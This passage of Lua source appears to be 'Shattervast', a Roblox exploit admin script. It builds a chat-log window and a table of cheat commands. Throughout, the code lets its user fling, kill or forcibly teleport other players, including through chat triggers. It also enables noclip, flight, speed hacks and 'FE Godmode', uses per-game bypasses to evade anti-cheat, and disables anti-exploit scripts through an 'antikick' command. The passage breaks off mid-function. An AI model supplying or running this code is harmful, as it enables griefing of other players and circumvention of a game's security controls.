	local ScrollingFrame = Instance.new("ScrollingFrame")
	ChatLogsv2.Name = "ChatLogsv2"
	ChatLogsv2.Parent = game.Players.LocalPlayer.PlayerGui
	ChatLogsv2.ResetOnSpawn = false
	MainChatFrame.Name = "MainChatFrame"
	MainChatFrame.Parent = ChatLogsv2
	MainChatFrame.BackgroundColor3 = Color3.new(1, 1, 1)
	MainChatFrame.BackgroundTransparency = 1
	MainChatFrame.Position = UDim2.new(0, 760, 0, 261)
	MainChatFrame.Size = UDim2.new(0, 525, 0, 337)
	MainChatFrame.Visible = false
	Framess.Parent = MainChatFrame
	Framess.BackgroundColor3 = Color3.new(0.0784314, 0.0784314, 0.0784314)
	Framess.BorderSizePixel = 0
	Framess.Size = UDim2.new(0, 525, 0, 15)
	CloseChatGUI.Name = "CloseChatGUI"
	CloseChatGUI.Parent = Framess
	CloseChatGUI.BackgroundColor3 = Color3.new(1, 1, 1)
	CloseChatGUI.BackgroundTransparency = 1
	CloseChatGUI.BorderSizePixel = 0
	CloseChatGUI.Position = UDim2.new(0, 495, 0, 0)
	CloseChatGUI.Size = UDim2.new(0, 30, 0, 15)
	CloseChatGUI.Font = Enum.Font.SourceSansBold
	CloseChatGUI.Text = "X"
	CloseChatGUI.TextColor3 = Color3.new(0.945098, 0.945098, 0.945098)
	CloseChatGUI.TextSize = 20
	Frame_222.Parent = MainChatFrame
	Frame_222.BackgroundColor3 = Color3.new(0.14902, 0.14902, 0.14902)
	Frame_222.BorderSizePixel = 0
	Frame_222.Position = UDim2.new(0, 0, 0, 15)
	Frame_222.Size = UDim2.new(0, 525, 0, 50)
	PrintChat.Name = "PrintChat"
	PrintChat.Parent = Frame_222
	PrintChat.BackgroundColor3 = Color3.new(0.870588, 0.25098, 0.25098)
	PrintChat.BorderSizePixel = 0
	PrintChat.Position = UDim2.new(0, 15, 0, 0)
	PrintChat.Size = UDim2.new(0, 170, 0, 30)
	PrintChat.Font = Enum.Font.SourceSansLight
	PrintChat.Text = "Print Chat"
	PrintChat.TextColor3 = Color3.new(0.960784, 0.960784, 0.960784)
	PrintChat.TextSize = 30
	PrintChat.TextWrapped = true
	Shadow1.Name = "Shadow1"
	Shadow1.Parent = MainChatFrame
	Shadow1.BackgroundColor3 = Color3.new(0, 0, 0)
	Shadow1.BackgroundTransparency = 0.5
	Shadow1.Position = UDim2.new(0, 2, 0, 2)
	Shadow1.Size = UDim2.new(0, 525, 0, 337)
	Shadow1.ZIndex = -1
	Shadow2.Name = "Shadow2"
	Shadow2.Parent = MainChatFrame
	Shadow2.BackgroundColor3 = Color3.new(0, 0, 0)
	Shadow2.BackgroundTransparency = 0.80000001192093
	Shadow2.Position = UDim2.new(0, 5, 0, 5)
	Shadow2.Size = UDim2.new(0, 525, 0, 337)
	Shadow2.ZIndex = -1
	ScrollingFrame.Parent = MainChatFrame
	ScrollingFrame.BackgroundColor3 = Color3.new(0.266667, 0.266667, 0.266667)
	ScrollingFrame.BorderSizePixel = 0
	ScrollingFrame.Position = UDim2.new(0, 0, 0, 65)
	ScrollingFrame.Size = UDim2.new(0, 525, 0, 271)
	ScrollingFrame.CanvasPosition = Vector2.new(0, 403)
	ScrollingFrame.ScrollBarThickness = 8
	function CreateChatText(plr, chat)
		for i,v in pairs(ScrollingFrame:GetDescendants()) do
			v.Position = v.Position - UDim2.new(0, 0, 0, 20)
			if v.Position == UDim2.new(0, 5, 0, 10) then
				v:Destroy()
			end
		end
		local Example = Instance.new("TextLabel")
		Example.Name = "Example"
		Example.Parent = ScrollingFrame
		Example.BackgroundColor3 = Color3.new(1, 1, 1)
		Example.BackgroundTransparency = 1
		Example.Position = UDim2.new(0, 5, 0, 650)
		Example.Size = UDim2.new(0, 500, 0, 20)
		Example.Font = Enum.Font.SourceSans
		Example.Text = "["..plr.Name.."]: "..chat
		Example.TextColor3 = Color3.new(0.960784, 0.960784, 0.960784)
		Example.TextScaled = true
		Example.TextSize = 20
		Example.TextWrapped = true
		Example.TextXAlignment = Enum.TextXAlignment.Left
	end
	CloseChatGUI.MouseButton1Click:Connect(function()
		MainChatFrame:TweenPosition(UDim2.new(0, 550, 0, -550), "InOut", "Sine", 2)
		wait(2.01)
		MainChatFrame.Visible = false
	end)
	printingChat = false
	PrintChat.MouseButton1Click:Connect(function()
		if printingChat == false then
			printingChat = true
			PrintChat.BackgroundColor3 = Color3.fromRGB(60, 200, 60)
		elseif printingChat == true then
			printingChat = false
			PrintChat.BackgroundColor3 = Color3.new(0.870588, 0.25098, 0.25098)
		end
	end)
	local UserInputService = game:GetService("UserInputService")
	local dragging
	local dragInput
	local dragStart
	local startPos
	local function updateChat(input)
		local delta = input.Position - dragStart
		local dragTime = 0.055
		local SmoothDrag = {}
		SmoothDrag.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
		local dragSmoothFunction = gsTween:Create(MainChatFrame, TweenInfo.new(dragTime, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), SmoothDrag)
		dragSmoothFunction:Play()
	end
	Frame_222.InputBegan:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
			dragging = true
			dragStart = input.Position
			startPos = MainChatFrame.Position
			input.Changed:Connect(function()
				if input.UserInputState == Enum.UserInputState.End then
					dragging = false
				end
			end)
		end
	end)
	Frame_222.InputChanged:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
			dragInput = input
		end
	end)
	UserInputService.InputChanged:Connect(function(input)
		if input == dragInput and dragging then
			updateChat(input)
		end
	end)

	function printChat(player, chat)
		print("["..player.Name.."]: "..chat)
	end
	complimentReady = true
	for i,currentPlayersChatting in pairs(game:GetService("Players"):GetPlayers()) do
		currentPlayersChatting.Chatted:connect(function(chat)
			CreateChatText(currentPlayersChatting, chat)
			if printingChat then
				printChat(currentPlayersChatting, chat)
			end
			if copychatACTIVE then
				if currentPlayersChatting == copychatplayer then
					gsReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(chat, "All")
				end
			end
			if modeFling == true then
				if string.lower(string.sub(chat, 1, 7)) == "!fling " then
					if gsWorkspace:PGSIsEnabled() == false then
						FEGodmode()
					end
					if string.lower(string.sub(chat, 8)) == "me" then
						run(commandPrefix.."unfling")
						LP.Character.HumanoidRootPart.CFrame = LP.Character.HumanoidRootPart.CFrame + Vector3.new(0, 10, 0)
						run(commandPrefix.."fling "..currentPlayersChatting.Name.." 2000000")
					else
						for i,notAll in pairs(findSinglePlayer(string.lower(string.sub(chat, 8)))) do
							if notAll ~= LP then
								run(commandPrefix.."unfling")
								LP.Character.HumanoidRootPart.CFrame = LP.Character.HumanoidRootPart.CFrame + Vector3.new(0, 10, 0)
								run(commandPrefix.."fling "..notAll.Name.." 2000000")
							end
						end
					end
				end
			end
			if modeCompliment == true then
				if string.lower(string.sub(chat, 1, 3)) == "!c " then
					if complimentReady then
						complimentReady = false
						if string.lower(string.sub(chat, 4)) == "me" then
							complimentplr(currentPlayersChatting)
						else
							for i,Others in pairs(findSinglePlayer(string.lower(string.sub(chat, 4)))) do
								if Others == LP then
									game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Don't be silly, I can't compliment myself!", "All")
								else
									complimentplr(Others)
								end
							end
						end
						wait(1)
						complimentReady = true
					end
				end
			end
			if modeMove == true then
				if string.lower(string.sub(chat, 1, 9)) == "!bringbot" then
					run(commandPrefix.."unfollow")
					run(commandPrefix.."unwalk")
					run(commandPrefix.."goto "..currentPlayersChatting.Name)
				elseif string.lower(string.sub(chat, 1, 6)) == "!walk " then
					for i,getWalkPlayer in pairs(findSinglePlayer(string.lower(string.sub(chat, 7)))) do
						if getWalkPlayer == LP then
							run(commandPrefix.."unfollow")
							run(commandPrefix.."walk "..currentPlayersChatting.Name)
						else
							run(commandPrefix.."unfollow")
							run(commandPrefix.."walk "..getWalkPlayer.Name)
						end
					end
				elseif string.lower(string.sub(chat, 1, 8)) == "!follow " then
					for i,getFollowPlayer in pairs(findSinglePlayer(string.lower(string.sub(chat, 9)))) do
						if getFollowPlayer == LP then
							run(commandPrefix.."unwalk")
							run(commandPrefix.."follow "..currentPlayersChatting.Name)
						else
							run(commandPrefix.."unwalk")
							run(commandPrefix.."follow "..getFollowPlayer.Name)
						end
					end
				end
			end
			if modeInfo == true then
				if infoReady then
					infoReady = false
					if string.lower(string.sub(chat, 1, 5)) == "!age " then
						for i,v in pairs(findSinglePlayer(string.lower(string.sub(chat, 6)))) do
							if v == LP then
								run(commandPrefix.."age "..currentPlayersChatting.Name)
							else
								run(commandPrefix.."age "..v.Name)
							end
						end
					end
					if string.lower(string.sub(chat, 1, 4)) == "!id " then
						for i,a in pairs(findSinglePlayer(string.lower(string.sub(chat, 5)))) do
							if a == LP then
								run(commandPrefix.."id "..currentPlayersChatting.Name)
							else
								run(commandPrefix.."id "..a.Name)
							end
						end
					end
					wait(1)
					infoReady = true
				end
			end
		end)
	end
	game:GetService("Players").PlayerAdded:connect(function(plr)
		plr.Chatted:connect(function(chat)
			CreateChatText(plr, chat)
			if printingChat then
				printChat(plr, chat)
			end
			if modeFling == true then
				if string.lower(string.sub(chat, 1, 7)) == "!fling " then
					if gsWorkspace:PGSIsEnabled() == false then
						FEGodmode()
					end
					if string.lower(string.sub(chat, 8)) == "me" then
						run(commandPrefix.."unfling")
						LP.Character.HumanoidRootPart.CFrame = LP.Character.HumanoidRootPart.CFrame + Vector3.new(0, 10, 0)
						run(commandPrefix.."fling "..plr.Name.." 2000000")
					else
						for i,notAll in pairs(findSinglePlayer(string.lower(string.sub(chat, 8)))) do
							if notAll ~= LP then
								run(commandPrefix.."unfling")
								LP.Character.HumanoidRootPart.CFrame = LP.Character.HumanoidRootPart.CFrame + Vector3.new(0, 10, 0)
								run(commandPrefix.."fling "..notAll.Name.." 2000000")
							end
						end
					end
				end
			end
			if modeCompliment == true then
				if string.lower(string.sub(chat, 1, 3)) == "!c " then
					if complimentReady == true then
						complimentReady = false
						if string.lower(string.sub(chat, 4)) == "me" then
							complimentplr(plr)
						else
							for i,Others in pairs(findSinglePlayer(string.lower(string.sub(chat, 4)))) do
								if Others == LP then
									game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Don't be silly, I can't compliment myself!", "All")
								else
									complimentplr(Others)
								end
							end
						end
						wait(1)
						complimentReady = true
					end
				end
			end
			if modeMove == true then
				if string.lower(string.sub(chat, 1, 9)) == "!bringbot" then
					run(commandPrefix.."unfollow")
					run(commandPrefix.."unwalk")
					run(commandPrefix.."goto "..plr.Name)
				elseif string.lower(string.sub(chat, 1, 6)) == "!walk " then
					for i,getWalkPlayer in pairs(findSinglePlayer(string.lower(string.sub(chat, 7)))) do
						if getWalkPlayer == LP then
							run(commandPrefix.."unfollow")
							run(commandPrefix.."walk "..plr.Name)
						else
							run(commandPrefix.."unfollow")
							run(commandPrefix.."walk "..getWalkPlayer.Name)
						end
					end
				elseif string.lower(string.sub(chat, 1, 8)) == "!follow " then
					for i,getFollowPlayer in pairs(findSinglePlayer(string.lower(string.sub(chat, 9)))) do
						if getFollowPlayer == LP then
							run(commandPrefix.."unwalk")
							run(commandPrefix.."follow "..plr.Name)
						else
							run(commandPrefix.."unwalk")
							run(commandPrefix.."follow "..getFollowPlayer.Name)
						end
					end
				end
			end
			if modeInfo == true then
				if infoReady then
					infoReady = false
					if string.lower(string.sub(chat, 1, 5)) == "!age " then
						for i,v in pairs(findSinglePlayer(string.lower(string.sub(chat, 6)))) do
							if v == LP then
								run(commandPrefix.."age "..plr.Name)
							else
								run(commandPrefix.."age "..v.Name)
							end
						end
					end
					if string.lower(string.sub(chat, 1, 4)) == "!id " then
						for i,a in pairs(findSinglePlayer(string.lower(string.sub(chat, 5)))) do
							if a == LP then
								run(commandPrefix.."id "..plr.Name)
							else
								run(commandPrefix.."id "..a.Name)
							end
						end
					end
					wait(1)
					infoReady = true
				end
			end
		end)
	end)

	-- Loops
	noclip = false
	following = false
	trailing = false
	annoying = false
	flingnoclip = false
	staring = false
	stopsitting = false
	stareplr = ""
	CBRINGamount = 3
	spawnWS = CurrentWalkspeed
	spawnJP = CurrentJumppower
	spawnHH = CurrentHipheight
	spawningfegod = false
	looptpbypassfly = false
	if game.GameId == 245662005 or game.GameId == 601130232 then
		bypassMODE = true
	else
		bypassMODE = false
	end
	viewplr = ""
	loopview = false
	cmdForward = false
	forwardSpeed = 1
	loopviewfc = false
	spinTOhead = false
	spinObj = ""
	rideACTIVE = false
	ridePLAYER = ""

	LPcurrenthumanoid = LP.Character.Humanoid
	game:GetService('RunService').Stepped:connect(function()
		if LP.Character.Humanoid ~= nil then
			LPcurrenthumanoid = LP.Character.Humanoid
		end
		if noclip then
			if LP.Character then
				if LP.Character.Humanoid.RigType == Enum.HumanoidRigType.R6 then
					LP.Character.Head.CanCollide = false
					LP.Character.Torso.CanCollide = false
					LP.Character["Left Leg"].CanCollide = false
					LP.Character["Right Leg"].CanCollide = false
					LP.Character["Left Arm"].CanCollide = false
					LP.Character["Right Arm"].CanCollide = false
				elseif LP.Character.Humanoid.RigType == Enum.HumanoidRigType.R15 then
					LP.Character.Head.CanCollide = false
					LP.Character.UpperTorso.CanCollide = false
					LP.Character.LowerTorso.CanCollide = false
					LP.Character.HumanoidRootPart.CanCollide = false
				end
			end
		end
		if following then
			LP.Character.HumanoidRootPart.CFrame = gsPlayers[flwplr.Name].Character.HumanoidRootPart.CFrame + gsPlayers[flwplr.Name].Character.HumanoidRootPart.CFrame.lookVector * flwnum
		end
		if trailing then
			LP.Character.HumanoidRootPart.CFrame = gsPlayers[trlplr.Name].Character.HumanoidRootPart.CFrame + gsPlayers[trlplr.Name].Character.HumanoidRootPart.CFrame.lookVector * trlnum
		end
		if annoying then
			LP.Character.HumanoidRootPart.CFrame = gsPlayers[annplr.Name].Character.HumanoidRootPart.CFrame
		end
		if walkto then
			LP.Character.Humanoid:MoveTo(walkplr.Character.HumanoidRootPart.Position)
		end
		if cbringing then
			CBRINGplr.Character.HumanoidRootPart.CFrame = LP.Character.HumanoidRootPart.CFrame + LP.Character.HumanoidRootPart.CFrame.lookVector * CBRINGamount
		end
		if cbringingall then
			for i,getbringplrs in pairs(gsPlayers:GetPlayers()) do
				if getbringplrs ~= LP then
					getbringplrs.Character.HumanoidRootPart.CFrame = LP.Character.HumanoidRootPart.CFrame + LP.Character.HumanoidRootPart.CFrame.lookVector * CBRINGamount
				end
			end
		end
		if staring then
			LP.Character.HumanoidRootPart.CFrame = CFrame.new(LP.Character.Torso.Position, gsPlayers[stareplr.Name].Character.Torso.Position)
		end
		if stopsitting then
			LP.Character.Humanoid.Sit = false
		end
		if looptpbypassfly then
			pcall(function()
				LP.Character.Head.Anchored = false
				LP.Character.HumanoidRootPart.CFrame = gsWorkspace.rGETpartNUMBER2.CFrame
				LP.Character.Head.Anchored = true
			end)
		end
		if loopview then
			view(viewplr)
		end
		if cmdForward then
			LP.Character.HumanoidRootPart.CFrame = LP.Character.HumanoidRootPart.CFrame + LP.Character.HumanoidRootPart.CFrame.lookVector * forwardSpeed
		end
		if loopviewfc then
			pcall(function()
				gsWorkspace.CurrentCamera.CameraSubject = gsWorkspace.rGETpartNUMBER2
			end)
		end
		if spinTOhead then
			pcall(function()
				spinObj.Position = LP.Character.Head.Position
			end)
		end
		if rideACTIVE == true then
			LP.character.HumanoidRootPart.CFrame = ridePLAYER.Character.HumanoidRootPart.CFrame + Vector3.new(0, 3, 0)
		end
	end)
	spawningatreset = false
	spawnresetpoint = LP.Character.Head.CFrame

	LPcurrenthumanoid.Died:Connect(function()
		flying = false
		doFREECAM = false
		if savingtoolsloop then
			run(commandPrefix.."savealltool")
		end
		if spawningatreset == true then
			spawnresetpoint = LP.Character.Head.CFrame + Vector3.new(0, 5, 0)
		end
	end)

	LP.CharacterAdded:Connect(function()
		wait(0.2)
		LP.Character.Humanoid.WalkSpeed = spawnWS
		LP.Character.Humanoid.JumpPower = spawnJP
		LP.Character.Humanoid.HipHeight = spawnHH
		if spawningfegod then
			FEGodmode()
		end
		if spawningpos and spawnpos ~= nil then
			LP.Character.HumanoidRootPart.CFrame = spawnpos
		end
		if spawningatreset == true then
			LP.Character.HumanoidRootPart.CFrame = spawnresetpoint
		end
	end)

	-- Commands
	Commands = {}

	Commands.print = function(args)
		local msg = table.concat(args," ")
		print(msg)
	end

	Commands.warn = function(args)
		local msg = table.concat(args," ")
		warn(msg)
	end

	Commands.sit = function(args)
		LP.Character.Humanoid.Sit = true
	end

	Commands.god = function(args)
		FEGodmode()
		Notification("warning", "You have enabled FE Godmode, tools will not work. Use "..commandPrefix.."grespawn to remove.", 7)
	end

	Commands.view = function(args)
		if args[1] then
			for i,v in pairs(findSinglePlayer(args[1])) do
				if bypassMODE == false then
					view(v)
					Notification("info", "Now viewing "..v.Name..". Use "..commandPrefix.."unview to stop viewing.", 3)
				elseif bypassMODE == true then
					viewplr = v
					loopview = true
				end
			end
		end
	end

	Commands.unview = function(args)
		view(LP)
		loopview = false
	end

	Commands.gravity = function(args)
		if args[1] then
			gsWorkspace.Gravity = args[1]
		end
	end

	Commands.ungravity = function(args)
		gsWorkspace.Gravity = CurrentGravity
	end

	Commands.goto = function(args)
		if args[1] then
			if bypassMODE == false then
				for i,v in pairs(findPlayer(args[1])) do
					LP.Character.HumanoidRootPart.CFrame = v.Character.HumanoidRootPart.CFrame
				end
			elseif bypassMODE == true then
				for i,v in pairs(findPlayer(args[1])) do
					local TPbypass = {}
					TPbypass.CFrame = v.Character.HumanoidRootPart.CFrame + Vector3.new(0, 5, 0)
					local TPFunction = gsTween:Create(LP.Character.HumanoidRootPart, TweenInfo.new(1.5, Enum.EasingStyle.Sine, Enum.EasingDirection.In), TPbypass)
					TPFunction:Play()
				end
			end
		end
	end

	Commands.fecheck = function(args)
		if gsWorkspace.FilteringEnabled == true then
			Notification("warning", "FE is enabled!", 7)
		else
			Notification("warning", "FE is disabled. Consider using a different script.", 7)
		end
	end

	Commands.lockws = function(args)
		lockWS()
		Notification("info", "Workspace locked.", 4)
	end

	Commands.unlockws = function(args)
		unlockWS()
		Notification("info", "Workspace unlocked.", 4)
	end

	Commands.noclip = function(args)
		noclip = true
		Notification("info", "Noclip enabled.", 4)
	end

	Commands.clip = function(args)
		noclip = false
		Notification("info", "Noclip disabled.", 4)
	end

	Commands.follow = function(args)
		if args[1] then
			for i,v in pairs(findPlayer(args[1])) do
				flwplr = v
			end
			if args[2] then
				flwnum = args[2]
			else
				flwnum = -5
			end
			following = true
		else
			Notification("warning", "No player selected to follow! Use: "..commandPrefix.."follow player", 4)
		end
	end

	Commands.unfollow = function(args)
		following = false
	end

	Commands.fling = function(args)
		if args[1] then
			for i,v in pairs(findSinglePlayer(args[1])) do
				if v ~= LP then
					view(v)
					pcall(function()
						LP.Character.HumanoidRootPart.Fling:Destroy()
					end)
					if not args[2] then
						RocketPropulsion(800000,1000,400000,v,"Fling")
					else
						RocketPropulsion(args[2],1500,400000,v,"Fling")
					end
					if noclip ~= true then
						flingnoclip = true
						noclip = true
					end
				end
			end
		else
			Notification("warning", "No player selected to fling! Use: "..commandPrefix.."fling player", 4)
		end
	end

	Commands.unfling = function(args)
		view(LP)
		pcall(function()
			if LP.Character.HumanoidRootPart.Fling then
				for i,v in pairs(LP.Character:GetDescendants()) do
					if v.Name == "Fling" and v:IsA("RocketPropulsion") then
						v:Destroy()
					end
				end
			end
		end)
		if flingnoclip == true then
			noclip = false
			flingnoclip = false
		end
	end

	Commands.trail = function(args)
		if args[1] then
			for i,v in pairs(findPlayer(args[1])) do
				trlplr = v
			end
			if args[2] then
				trlnum = args[2]
			else
				trlnum = 5
			end
			trailing = true
		else
			Notification("warning", "No player selected to trail! Use: "..commandPrefix.."trail player", 4)
		end
	end

	Commands.untrail = function(args)
		trailing = false
	end

	Commands.annoy = function(args)
		if args[1] then
			for i,v in pairs(findPlayer(args[1])) do
				annplr = v
			end
			annoying = true
		else
			Notification("warning", "No player selected to annoy! Use: "..commandPrefix.."annoy player", 4)
		end
	end

	Commands.unannoy = function(args)
		annoying = false
	end

	Commands.reset = function(args)
		LP.Character:BreakJoints()
	end

	Commands.grespawn = function(args)
		LP.Character.Humanoid.Health = 0
		wait(1)
		LP.Character.Head.CFrame = CFrame.new(1000000,0,1000000)
		LP.Character.Torso.CFrame = CFrame.new(1000000,0,1000000)
	end

	Commands.respawn = function(args)
		local mod = Instance.new('Model', workspace) mod.Name = 'new '..LP.Name
		local hum = Instance.new('Humanoid', mod)
		local ins = Instance.new('Part', mod) ins.Name = 'Torso' ins.CanCollide = false ins.Transparency = 1
		LP.Character = mod
	end

	Commands.speed = function(args)
		if args[1] then
			run(commandPrefix.."ws "..args[1])
		end
	end

	bypassingwalkspeed = false
	Commands.ws = function(args)
		if args[1] then
			if bypassMODE == false then
				LP.Character.Humanoid.WalkSpeed = args[1]
			elseif bypassMODE == true then
				if game.GameId == 245662005 then
					bypassingwalkspeed = true
					bypassWalkspeed = args[1]
				end
			end
		end
	end

	game:GetService("RunService").Heartbeat:Connect(function()
		if bypassingwalkspeed then
			LP.Character.Humanoid.WalkSpeed = bypassWalkspeed
		end
	end)

	Commands.jumppower = function(args)
		if args[1] then
			LP.Character.Humanoid.JumpPower = args[1]
		end
	end

	Commands.jp = function(args)
		if args[1] then
			LP.Character.Humanoid.JumpPower = args[1]
		end
	end

	Commands.hipheight = function(args)
		if args[1] then
			LP.Character.Humanoid.HipHeight = args[1]
		end
	end

	Commands.hh = function(args)
		if args[1] then
			LP.Character.Humanoid.HipHeight = args[1]
		end
	end

	Commands.default = function(args)
		LP.Character.Humanoid.WalkSpeed = CurrentWalkspeed
		LP.Character.Humanoid.HipHeight = CurrentHipheight
		LP.Character.Humanoid.JumpPower = CurrentJumppower
	end

	Commands.credits = function(args)
		Notification("info", "Shattervast was made by illremember#3799 , "..commandPrefix.."fullcredits for all credits.", 8)
	end

	Commands.attach = function(args)
		if hasTools() == false then
			Notification("warning", "You need a tool in your backpack/inventory to use this command.", 8)
		else
			FEGodmode()
			for i,v in pairs(LP.Backpack:GetChildren())do
				LP.Character.Humanoid:EquipTool(v)
			end
			if args[1] then
				for i,v in pairs(findSinglePlayer(args[1])) do
					if v ~= LP then
						LP.Character.HumanoidRootPart.CFrame = v.Character["Left Arm"].CFrame
						wait(0.3)
						LP.Character.HumanoidRootPart.CFrame = v.Character["Left Arm"].CFrame
					end
				end
			end
		end
	end

	Commands.fly = function(args)
		if bypassMODE == false then
			local speedget = 1
			repeat wait() until LP and LP.Character and LP.Character:FindFirstChild('HumanoidRootPart') and LP.Character:FindFirstChild('Humanoid')
			repeat wait() until Mouse
			if args[1] then
				speedfly = args[1]
			else
				speedfly = 1
			end

			local T = LP.Character.HumanoidRootPart
			local CONTROL = {F = 0, B = 0, L = 0, R = 0}
			local lCONTROL = {F = 0, B = 0, L = 0, R = 0}
			local SPEED = speedget

			local function fly()
				flying = true
				local BG = Instance.new('BodyGyro', T)
				local BV = Instance.new('BodyVelocity', T)
				BG.P = 9e4
				BG.maxTorque = Vector3.new(9e9, 9e9, 9e9)
				BG.cframe = T.CFrame
				BV.velocity = Vector3.new(0, 0.1, 0)
				BV.maxForce = Vector3.new(9e9, 9e9, 9e9)
				spawn(function()
					repeat wait()
						LP.Character.Humanoid.PlatformStand = true
						if CONTROL.L + CONTROL.R ~= 0 or CONTROL.F + CONTROL.B ~= 0 then
							SPEED = 50
						elseif not (CONTROL.L + CONTROL.R ~= 0 or CONTROL.F + CONTROL.B ~= 0) and SPEED ~= 0 then
							SPEED = 0
						end
						if (CONTROL.L + CONTROL.R) ~= 0 or (CONTROL.F + CONTROL.B) ~= 0 then
							BV.velocity = ((workspace.CurrentCamera.CoordinateFrame.lookVector * (CONTROL.F + CONTROL.B)) + ((workspace.CurrentCamera.CoordinateFrame * CFrame.new(CONTROL.L + CONTROL.R, (CONTROL.F + CONTROL.B) * 0.2, 0).p) - workspace.CurrentCamera.CoordinateFrame.p)) * SPEED
							lCONTROL = {F = CONTROL.F, B = CONTROL.B, L = CONTROL.L, R = CONTROL.R}
						elseif (CONTROL.L + CONTROL.R) == 0 and (CONTROL.F + CONTROL.B) == 0 and SPEED ~= 0 then
							BV.velocity = ((workspace.CurrentCamera.CoordinateFrame.lookVector * (lCONTROL.F + lCONTROL.B)) + ((workspace.CurrentCamera.CoordinateFrame * CFrame.new(lCONTROL.L + lCONTROL.R, (lCONTROL.F + lCONTROL.B) * 0.2, 0).p) - workspace.CurrentCamera.CoordinateFrame.p)) * SPEED
						else
							BV.velocity = Vector3.new(0, 0.1, 0)
						end
						BG.cframe = workspace.CurrentCamera.CoordinateFrame
					until not flying
					CONTROL = {F = 0, B = 0, L = 0, R = 0}
					lCONTROL = {F = 0, B = 0, L = 0, R = 0}
					SPEED = 0
					BG:destroy()
					BV:destroy()
					LP.Character.Humanoid.PlatformStand = false
				end)
			end
			Mouse.KeyDown:connect(function(KEY)
				if KEY:lower() == 'w' then
					CONTROL.F = speedfly
				elseif KEY:lower() == 's' then
					CONTROL.B = -speedfly
				elseif KEY:lower() == 'a' then
					CONTROL.L = -speedfly 
				elseif KEY:lower() == 'd' then 
					CONTROL.R = speedfly
				end
			end)
			Mouse.KeyUp:connect(function(KEY)
				if KEY:lower() == 'w' then
					CONTROL.F = 0
				elseif KEY:lower() == 's' then
					CONTROL.B = 0
				elseif KEY:lower() == 'a' then
					CONTROL.L = 0
				elseif KEY:lower() == 'd' then
					CONTROL.R = 0
				end
			end)
			fly()
		elseif bypassMODE == true then
			if not args[1] then
				run(commandPrefix.."fc")
			else
				run(commandPrefix.."fc "..args[1])
			end
			LP.Character.Head.Anchored = false
			looptpbypassfly = true
			view(LP)
		end
	end

	Commands.unfly = function(args)
		if bypassMODE == false then
			flying = false
			LP.Character.Humanoid.PlatformStand = false
		else
			looptpbypassfly = false
			run(commandPrefix.."unfreecam")
			local goalTP = LP.Character.HumanoidRootPart.CFrame
			if game.GameId == 245662005 then
				for i = 1, 5 do wait(0.2)
					LP.Character.HumanoidRootPart.CFrame = goalTP
				end
			else
				LP.Character.HumanoidRootPart.CFrame = goalTP
			end
			LP.Character.Head.Anchored = false
		end
	end

	Commands.kill = function(args)
		if args[1] then
			for i,v in pairs(findSinglePlayer(args[1])) do
				if v == LP then
					LP.Character:BreakJoints()
				else
					if hasTools() == false then
						Notification("warning", "You need a tool in your backpack/inventory to use this command.", 8)
					else
						FEGodmode()
						for i,v in pairs(LP.Backpack:GetChildren())do
							LP.Character.Humanoid:EquipTool(v)
						end
						local NOW = LP.Character.HumanoidRootPart.CFrame
						LP.Character.HumanoidRootPart.CFrame = v.Character["Left Arm"].CFrame
						wait(0.3)
						LP.Character.HumanoidRootPart.CFrame = v.Character["Left Arm"].CFrame
						local function tp(player,player2)
							local char1,char2=player.Character,player2.Character
							if char1 and char2 then
								char1:MoveTo(char2.Head.Position)
							end
						end
						wait(0.5)
						LP.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(100000,0,100000))
						wait(0.5)
						tp(LP,game:GetService("Players")[v.Name])
						wait(0.7)
						LP.Character.HumanoidRootPart.CFrame = NOW
						view(LP)
					end
				end
			end
		end
	end
	Commands.bring = function(args)
		if hasTools() == false then
			Notification("warning", "You need a tool in your backpack/inventory to use this command.", 8)
		else
			FEGodmode()
			for i,v in pairs(LP.Backpack:GetChildren())do
				LP.Character.Humanoid:EquipTool(v)
			end
			if args[1] then
				for i,v in pairs(findSinglePlayer(args[1])) do
					if v ~= LP then
						local NOW = LP.Character.HumanoidRootPart.CFrame
						local function tp(player,player2)
							local char1,char2=player.Character,player2.Character
							if char1 and char2 then
								char1.HumanoidRootPart.CFrame = char2.HumanoidRootPart.CFrame
							end
						end
						local function getout(player,player2)
							local char1,char2=player.Character,player2.Character
							if char1 and char2 then
								char1:MoveTo(char2.Head.Position)
							end
						end
						tp(game:GetService("Players")[v.Name], LP)
						wait(0.2)
						tp(game:GetService("Players")[v.Name], LP)
						wait(0.5)
						LP.Character.HumanoidRootPart.CFrame = NOW
						wait(0.5)
						getout(LP, game:GetService("Players")[v.Name])
						wait(0.3)
						LP.Character.HumanoidRootPart.CFrame = NOW
					end
				end
			end
		end
	end

	Commands.naked = function(args)
		for i,v in pairs(LP.Character:GetDescendants()) do
			if v:IsA("Clothing") then
				v:Destroy()
			end
		end
	end

	Commands.nolimbs = function(args)
		LP.Character["Left Arm"]:Destroy()
		LP.Character["Right Arm"]:Destroy()
		LP.Character["Left Leg"]:Destroy()
		LP.Character["Right Leg"]:Destroy()
	end

	Commands.noarms = function(args)
		LP.Character["Left Arm"]:Destroy()
		LP.Character["Right Arm"]:Destroy()
	end

	Commands.nolegs = function(args)
		LP.Character["Left Leg"]:Destroy()
		LP.Character["Right Leg"]:Destroy()
	end

	Commands.headless = function(args)
		local l = LP.Character.Humanoid:Clone()
		LP.Character.Humanoid:Destroy()
		wait(0.2)
		LP.Character.Head.CanCollide = false
		for i,v in pairs(LP.Character:GetDescendants()) do
			if string.sub(v.Name, 1, 4) == "Neck" then
				v:Destroy()
			end
		end
		wait(0.2)
		l.Name = "Humanoid"
		l.Parent = LP.Character
		wait(0.1)
		game:GetService("Workspace").CurrentCamera.CameraSubject = LP.Character
		LP.Character.Animate:Destroy()
	end

	antiremotes = false
	Commands.antikick = function(args)
		if args[1] then
			if args[1] == "on" then
				antiremotes = true
				wait(0.2)
				for i,v in pairs(LP.Character:GetChildren()) do
					if string.find(string.lower(v.Name), "exploit") and v:IsA("LocalScript") then
						v.Disabled = true
					end
				end
